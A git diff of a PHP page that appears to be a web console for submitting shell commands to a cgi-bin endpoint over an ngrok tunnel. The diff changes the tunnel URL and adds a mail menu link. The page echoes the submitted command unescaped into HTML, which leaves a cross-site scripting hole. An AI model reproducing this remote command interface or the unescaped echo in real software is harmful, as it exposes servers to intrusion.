@@ -1,7 +1,7 @@
 <?php 
 $user = "yobah";
 //$url = "https://2e896ca59b85.ngrok.io/cgi-bin/";
-$url = "https://4dd9fb3c4848.ngrok.io/cgi-bin/";
+$url = "https://ee6b0ad75293.ngrok.io/cgi-bin/";
 $cmd = "";
 
 //gets system information of server
@@ -10,6 +10,7 @@ $system = file_get_contents($sysInfoApi);
 if(isset($_POST["cmd"])){
     $cmd = $_POST["cmd"];
 }
+
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -29,6 +30,7 @@ if(isset($_POST["cmd"])){
                 <li id = "menu" onclick = 'sideBar()'>MENU</li>
                 <li>HELP</li>
                 <li>SYSTEM INFO</li>
+                <li onclick = 'window.open("mail.php", "_blank")'>MAIL</li>
                 <div style = "border: 1px solid  #e43f5a;
                               font-family: 'Courier New', Courier, monospace;
                               font-weight: bold;
@@ -38,7 +40,7 @@ if(isset($_POST["cmd"])){
                               box-shadow: 1px 3px 10px black;
                               background-color: #e43f5a;" 
                               id = "top-right">
-                    OS: <?php echo $system ?>         
+                    OS: <?php echo $system ?>       
                 </div>
             </ul>
         </div>
@@ -76,7 +78,7 @@ if(isset($_POST["cmd"])){
                        type="text" name = "cmd" 
                        placeholder="ENTER YOUR COMMANDS HERE!!!" 
                        value = '<?php echo $cmd ?>'autofocus required/>
-                <input id = "smtbtn" type= "submit" value = "EXECUTE">
+                <input onload = "loader()" id = "smtbtn" type= "submit" value = "EXECUTE">
             </form>
         </div>
      </div>
@@ -87,6 +89,5 @@ if(isset($_POST["cmd"])){
         <div class = "loader">B.M.B</div>
         </div>
     </div>
-
 </body>
 </html>
